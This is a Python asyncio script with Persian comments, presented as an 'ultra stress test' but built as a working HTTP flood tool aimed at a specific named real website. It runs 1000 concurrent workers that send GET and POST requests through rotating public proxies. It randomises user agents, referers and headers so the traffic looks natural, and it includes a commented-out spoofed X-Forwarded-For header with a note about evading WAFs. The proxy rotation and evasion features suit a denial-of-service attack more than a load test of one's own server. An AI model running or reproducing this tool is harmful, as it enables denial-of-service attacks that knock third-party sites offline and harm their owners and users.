import asyncio
import aiohttp
import aiofiles # برای خواندن ناهمزمان فایل پروکسی
import random
import time
import logging
from datetime import datetime, timedelta

# --- تنظیمات اصلی اسکریپت ---
TARGET_URL = "https://kimialastic.com/"  # آدرس سروری که می‌خوای تست کنی
PROXY_FILE = "working_proxies.txt"
LOG_FILE = "ultra_stress_test_log.txt"

# مدت زمان تست (به دقیقه)
TEST_DURATION_MINUTES = 5 # می‌تونی برای تست‌های اولیه کمترش کنی

# تعداد کارگرهای ناهمزمان (تعداد درخواست‌های همزمانی که تلاش می‌کنیم ارسال کنیم)
# این عدد رو با توجه به منابع سیستم و تعداد پروکسی‌ها با احتیاط تنظیم کن
# برای "هزاران" RPS، این عدد باید خیلی بالا باشه، مثلا 1000، 2000 یا بیشتر
# اما با پروکسی‌های عمومی، رسیدن به این عدد در عمل خیلی سخته
CONCURRENT_REQUESTS_TARGET = 1000

# Timeout برای هر درخواست (ثانیه) - کوتاه برای سرعت بالا
REQUEST_TIMEOUT_SECONDS = 3

# بررسی SSL - اگر سرور تست شما گواهی self-signed داره، False کن
VERIFY_SSL = True

# --- تنظیمات لاگ‌گیری ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s', # حذف نام ترد چون در asyncio متفاوت است
    handlers=[
        logging.FileHandler(LOG_FILE, mode='w'),
        logging.StreamHandler()
    ]
)

# --- لیست‌های کمکی برای طبیعی‌تر کردن درخواست‌ها ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
]
REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    TARGET_URL, # گاهی اوقات رفرر خود سایت است
    f"{TARGET_URL}some/internal/page",
    "https://t.co/", # رفرر از توییتر
    "https://www.facebook.com/"
]
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9", "fa-IR,fa;q=0.8,en-US;q=0.7,en;q=0.6", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9",
    "de-DE,de;q=0.9", "zh-CN,zh;q=0.9", "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "ru-RU,ru;q=0.9"
]
ACCEPT_ENCODINGS = ["gzip, deflate, br", "gzip, deflate", "identity"]
ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
]


# --- متغیرهای سراسری برای آمار (استفاده از asyncio.Event برای هماهنگی بهتر) ---
# برای شمارنده‌ها، در محیط asyncio، اگر فقط از یک تسک اصلی برای آپدیت استفاده کنیم یا آپدیت‌ها اتمیک باشند، نیازی به lock نیست
# اما برای سادگی و اطمینان، می‌توان از asyncio.Lock استفاده کرد اگر چندین تسک همزمان شمارنده‌ها را آپدیت می‌کنند.
# اینجا شمارنده‌ها فقط در send_request_worker آپدیت میشن که خودشون تسک‌های جدا هستن.
# برای نمایش آمار به صورت دوره‌ای، یک تسک جداگانه خواهیم داشت.
# برای این نسخه، شمارنده‌های ساده پایتون استفاده می‌کنیم و در تسک اصلی آمار، با احتیاط می‌خوانیم.
stats = {
    "attempted": 0,
    "reached_server": 0, # 2xx, 3xx, 4xx, 5xx
    "successful_2xx_3xx": 0,
    "server_http_errors_4xx_5xx": 0,
    "timeout_errors": 0,
    "proxy_conn_errors": 0,
    "other_errors": 0
}
# استفاده از asyncio.Lock برای آپدیت امن شمارنده‌ها از تسک‌های مختلف
stats_lock = asyncio.Lock()

# --- لیست پروکسی‌ها (به صورت سراسری پس از بارگذاری) ---
PROXIES_LIST = []


async def load_proxies_async(filename):
    """پروکسی‌ها را به صورت ناهمزمان از فایل می‌خواند."""
    global PROXIES_LIST
    loaded_proxies = []
    try:
        async with aiofiles.open(filename, mode="r") as f:
            async for line in f:
                proxy = line.strip()
                if proxy and not proxy.startswith("#"): #نادیده گرفتن خطوط کامنت شده
                    if not proxy.startswith("http://") and not proxy.startswith("https://"):
                        loaded_proxies.append(f"http://{proxy}")
                    else:
                        loaded_proxies.append(proxy)
        PROXIES_LIST = loaded_proxies
        if not PROXIES_LIST:
            logging.error(f"هیچ پروکسی در فایل '{filename}' یافت نشد یا همه کامنت شده بودند.")
            return False
        logging.info(f"تعداد {len(PROXIES_LIST)} پروکسی از فایل '{filename}' خوانده شد.")
        return True
    except FileNotFoundError:
        logging.error(f"فایل پروکسی '{filename}' یافت نشد.")
        return False
    except Exception as e:
        logging.error(f"خطا در خواندن فایل پروکسی: {e}")
        return False


async def send_request_worker(session: aiohttp.ClientSession, worker_id: int, target_url: str, end_time: datetime):
    """یک کارگر ناهمزمان که به طور مداوم درخواست ارسال می‌کند تا زمان پایان فرا برسد."""
    global stats
    
    while datetime.now() < end_time:
        if not PROXIES_LIST:
            await asyncio.sleep(0.1) # اگر لیست پروکسی هنوز بارگذاری نشده یا خالی است، کمی صبر کن
            continue

        proxy_url = random.choice(PROXIES_LIST)
        method = random.choice(["GET", "POST"])
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
            "Accept-Encoding": random.choice(ACCEPT_ENCODINGS),
            "Accept": random.choice(ACCEPT_HEADERS),
            "Connection": "keep-alive", # یا "close" برای تست‌های خاص
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            # "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" # برخی WAF ها ممکن است این را بررسی کنند
        }
        
        post_data = None
        if method == "POST":
            # داده‌های POST را می‌توان پیچیده‌تر و متنوع‌تر کرد
            post_data = {f"param_{random.randint(1,5)}": f"value_{random.randint(1,1000)}"}

        request_made_to_server = False
        try:
            # logging.debug(f"Worker {worker_id}: Sending {method} to {target_url} via {proxy_url}")
            start_req_time = time.perf_counter()
            async with session.request(
                method, 
                target_url, 
                proxy=proxy_url, 
                headers=headers, 
                data=post_data,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT_SECONDS),
                ssl=VERIFY_SSL # یا یک آبجکت ssl.SSLContext برای تنظیمات پیشرفته‌تر
            ) as response:
                # اگر به اینجا برسیم، یعنی پاسخی از سرور (حتی خطا) دریافت شده است
                request_made_to_server = True
                # خواندن محتوا برای اطمینان از تکمیل درخواست (می‌تواند برای تست بار خالص، اختیاری باشد)
                # await response.read() # یا response.text() / response.json()
                
                async with stats_lock:
                    stats["reached_server"] += 1
                    if 200 <= response.status < 400: # موفقیت (2xx) و ریدایرکت (3xx)
                        stats["successful_2xx_3xx"] += 1
                    else: # خطاهای سمت سرور (4xx, 5xx)
                        stats["server_http_errors_4xx_5xx"] += 1
                        if response.status == 403:
                             logging.warning(f"Worker {worker_id}: HTTP 403 Forbidden از سرور با پروکسی {proxy_url} - URL: {target_url}")
                        elif response.status == 429:
                             logging.warning(f"Worker {worker_id}: HTTP 429 Too Many Requests از سرور با پروکسی {proxy_url} - URL: {target_url}")
                        # else:
                        #     logging.debug(f"Worker {worker_id}: HTTP Error {response.status} from server using proxy {proxy_url}")
            
            # logging.debug(f"Worker {worker_id}: Request took {time.perf_counter() - start_req_time:.4f}s")

        except aiohttp.ClientConnectorCertificateError as e:
            # خطای SSL خاص
            async with stats_lock:
                stats["proxy_conn_errors"] +=1
            logging.warning(f"Worker {worker_id}: SSL Certificate Error با پروکسی {proxy_url}. Error: {type(e).__name__}")
        except aiohttp.ClientConnectorError as e:
            # خطاهای کلی اتصال به پروکسی (مثلاً پروکسی در دسترس نیست)
            async with stats_lock:
                stats["proxy_conn_errors"] +=1
            # logging.warning(f"Worker {worker_id}: Proxy Connection Error با {proxy_url}. Error: {type(e).__name__}")
        except asyncio.TimeoutError: # این خطا توسط aiohttp.ClientTimeout ایجاد می‌شود
            async with stats_lock:
                stats["timeout_errors"] += 1
            # logging.warning(f"Worker {worker_id}: Request Timeout با {proxy_url}")
        except aiohttp.ClientError as e: # سایر خطاهای aiohttp
            async with stats_lock:
                if request_made_to_server: # اگر خطا بعد از رسیدن به سرور بود (مثلا در خواندن پاسخ)
                    stats["server_http_errors_4xx_5xx"] += 1 # یا یک دسته خطای جدید
                else: # خطا قبل از رسیدن به سرور
                    stats["proxy_conn_errors"] +=1
            logging.error(f"Worker {worker_id}: ClientError با {proxy_url}. Error: {type(e).__name__} - {e}")
        except Exception as e:
            async with stats_lock:
                stats["other_errors"] += 1
            logging.critical(f"Worker {worker_id}: خطای ناشناخته بحرانی با {proxy_url}: {type(e).__name__} - {e}")
        finally:
            async with stats_lock:
                stats["attempted"] += 1
        
        # فاصله بسیار کوتاه برای جلوگیری از اشباع کامل CPU در حلقه while در یک تسک
        # برای نرخ بسیار بالا، این می‌تواند 0 باشد یا خیلی کم
        # اگر پروکسی‌ها کند باشند، بیشتر زمان در انتظار پاسخ شبکه صرف می‌شود.
        await asyncio.sleep(0.001) # این می‌تواند بسیار کوچک یا حتی صفر باشد


async def display_stats_periodically(start_time: datetime, end_time: datetime):
    """هر چند ثانیه آمار را نمایش می‌دهد."""
    global stats
    interval_seconds = 10 # هر ۱۰ ثانیه آمار چاپ شود
    while datetime.now() < end_time:
        await asyncio.sleep(interval_seconds)
        if datetime.now() >= end_time: # اگر در حین sleep زمان تمام شد
            break

        current_duration_seconds = (datetime.now() - start_time).total_seconds()
        if current_duration_seconds == 0: continue

        async with stats_lock: # برای خواندن امن آمار
            # کپی کردن آمار برای جلوگیری از تغییر در حین محاسبه
            current_stats = stats.copy()

        attempted_rps = current_stats["attempted"] / current_duration_seconds
        reached_server_rps = current_stats["reached_server"] / current_duration_seconds
        successful_rps = current_stats["successful_2xx_3xx"] / current_duration_seconds
        
        logging.info(
            f"آمار جاری ({current_duration_seconds:.0f}s): "
            f"تلاش‌ها={current_stats['attempted']} ({attempted_rps:.2f} RPS), "
            f"رسیده به سرور={current_stats['reached_server']} ({reached_server_rps:.2f} RPS), "
            f"موفق(2xx/3xx)={current_stats['successful_2xx_3xx']} ({successful_rps:.2f} RPS), "
            f"خطای سرور(4xx/5xx)={current_stats['server_http_errors_4xx_5xx']}, "
            f"Timeout={current_stats['timeout_errors']}, "
            f"خطای اتصال/پروکسی={current_stats['proxy_conn_errors']}, "
            f"سایر خطاها={current_stats['other_errors']}"
        )


async def main_stress_test():
    global stats # برای ریست کردن در هر اجرا (اگر لازم باشد اسکریپت چندین بار در یک پروسه ران شود)
    stats = {k: 0 for k in stats} # ریست کردن آمار

    logging.info(f"--- شروع تست فشار بسیار بالا برای {TARGET_URL} ---")
    logging.info(f"مدت زمان تست: {TEST_DURATION_MINUTES} دقیقه")
    logging.info(f"تعداد کارگرهای همزمان (هدف): {CONCURRENT_REQUESTS_TARGET}")
    logging.info(f"Timeout درخواست: {REQUEST_TIMEOUT_SECONDS} ثانیه")
    logging.info(f"بررسی SSL: {VERIFY_SSL}")

    if not await load_proxies_async(PROXY_FILE):
        logging.critical("بارگذاری پروکسی‌ها ناموفق بود. خاتمه اسکریپت.")
        return

    start_time_obj = datetime.now()
    end_time_obj = start_time_obj + timedelta(minutes=TEST_DURATION_MINUTES)

    logging.info(f"زمان شروع: {start_time_obj.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.info(f"زمان مورد انتظار پایان: {end_time_obj.strftime('%Y-%m-%d %H:%M:%S')}")

    # تنظیمات کانکشن برای aiohttp
    # limit_per_host: تعداد اتصالات همزمان به یک هاست (IP:Port) خاص.
    # limit: تعداد کل اتصالات همزمان در کانکتور.
    # برای فشار بالا، limit را بالا می‌بریم. limit_per_host هم اگر به یک URL خاص حمله می‌کنیم باید بالا باشد.
    # چون از پروکسی‌های مختلف استفاده می‌کنیم، limit کلی مهم‌تر است.
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS_TARGET + 50, ssl=VERIFY_SSL, force_close=True, enable_cleanup_closed=True)
    # force_close=True و enable_cleanup_closed=True برای مدیریت بهتر اتصالات و جلوگیری از resource leak
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # ایجاد تسک نمایش آمار
        stats_display_task = asyncio.create_task(display_stats_periodically(start_time_obj, end_time_obj))

        # ایجاد و اجرای تسک‌های کارگر
        worker_tasks = []
        for i in range(CONCURRENT_REQUESTS_TARGET):
            task = asyncio.create_task(send_request_worker(session, i + 1, TARGET_URL, end_time_obj))
            worker_tasks.append(task)

        # منتظر ماندن تا زمان تست تمام شود یا همه تسک‌ها (به دلیلی) زودتر تمام شوند
        # راه اصلی کنترل، بررسی end_time در خود worker هاست.
        # اینجا فقط منتظر می‌مانیم تا همه تسک‌ها کارشان تمام شود.
        try:
            # منتظر می‌مانیم تا همه تسک‌های کارگر تمام شوند.
            # اگر مدت زمان تست طولانی باشد، این await ممکن است خیلی طول بکشد.
            # چون end_time در خود workerها چک می‌شود، آنها خودشان در زمان مناسب خارج می‌شوند.
            # اگر می‌خواهید برنامه اصلی بعد از اتمام زمان تست سریعتر خارج شود، باید یک تایمر اینجا هم بگذارید.
            # یا اینکه منتظر stats_display_task بمانیم که خودش با end_time کنترل می‌شود.
            
            # صبر می‌کنیم تا مدت زمان تست به پایان برسد
            time_to_wait = (end_time_obj - datetime.now()).total_seconds()
            if time_to_wait > 0:
                await asyncio.sleep(time_to_wait)
            
            logging.info("زمان تست به پایان رسیده. ارسال سیگنال توقف به کارگرها (آنها خودشان باید متوجه شوند)...")
            # کارگرها با چک کردن end_time متوقف می‌شوند.
            # منتظر اتمام همه تسک‌های کارگر می‌مانیم
            await asyncio.gather(*worker_tasks, return_exceptions=True) # جمع آوری نتایج یا خطاهای تسک‌ها
            
            # متوقف کردن تسک نمایش آمار اگر هنوز در حال اجراست
            if not stats_display_task.done():
                stats_display_task.cancel()
                try:
                    await stats_display_task
                except asyncio.CancelledError:
                    logging.info("تسک نمایش آمار متوقف شد.")

        except KeyboardInterrupt:
            logging.warning("توقف اسکریپت توسط کاربر (Ctrl+C). لغو تسک‌های در حال اجرا...")
            # لغو همه تسک‌ها
            for task in worker_tasks:
                task.cancel()
            if not stats_display_task.done():
                stats_display_task.cancel()
            
            await asyncio.gather(*worker_tasks, return_exceptions=True) # منتظر لغو شدن
            if not stats_display_task.done():
                 try:
                    await stats_display_task
                 except asyncio.CancelledError:
                    pass
            logging.info("همه تسک‌ها لغو شدند.")
        except Exception as e:
            logging.critical(f"خطای پیش‌بینی نشده در حلقه اصلی: {e}", exc_info=True)


    # --- نمایش آمار نهایی ---
    logging.info("--- پایان تست فشار بسیار بالا ---")
    duration_actual_seconds = (datetime.now() - start_time_obj).total_seconds()
    if duration_actual_seconds <= 0: duration_actual_seconds = 1 # جلوگیری از تقسیم بر صفر

    # کپی نهایی آمار برای نمایش
    final_stats = stats.copy()

    attempted_rps_final = final_stats["attempted"] / duration_actual_seconds
    reached_server_rps_final = final_stats["reached_server"] / duration_actual_seconds
    successful_rps_final = final_stats["successful_2xx_3xx"] / duration_actual_seconds

    logging.info(f"مدت زمان واقعی تست: {duration_actual_seconds:.2f} ثانیه")
    logging.info(
        f"کل تلاش‌ها={final_stats['attempted']} (متوسط {attempted_rps_final:.2f} RPS)"
    )
    logging.info(
        f"رسیده به سرور={final_stats['reached_server']} (متوسط {reached_server_rps_final:.2f} RPS)"
    )
    logging.info(
        f"  - موفق (2xx/3xx)={final_stats['successful_2xx_3xx']} (متوسط {successful_rps_final:.2f} RPS)"
    )
    logging.info(
        f"  - خطای سرور (4xx/5xx)={final_stats['server_http_errors_4xx_5xx']}"
    )
    logging.info(f"خطاهای Timeout={final_stats['timeout_errors']}")
    logging.info(f"خطاهای اتصال/پروکسی={final_stats['proxy_conn_errors']}")
    logging.info(f"سایر خطاها={final_stats['other_errors']}")

    if final_stats["reached_server"] > 0:
        actual_success_rate = (final_stats["successful_2xx_3xx"] / final_stats["reached_server"]) * 100
        logging.info(f"درصد موفقیت درخواست‌های رسیده به سرور: {actual_success_rate:.2f}%")
    
    if final_stats["attempted"] > 0:
        overall_reach_rate = (final_stats["reached_server"] / final_stats["attempted"]) * 100
        logging.info(f"درصد رسیدن تلاش‌ها به سرور: {overall_reach_rate:.2f}%")

    logging.info(f"لاگ‌های کامل در فایل '{LOG_FILE}' ذخیره شد.")


if __name__ == "__main__":
    try:
        asyncio.run(main_stress_test())
    except KeyboardInterrupt:
        logging.info("برنامه توسط کاربر متوقف شد (خارج از حلقه اصلی asyncio).")
    except Exception as e:
        logging.critical(f"خطای مهلک در اجرای برنامه: {e}", exc_info=True)
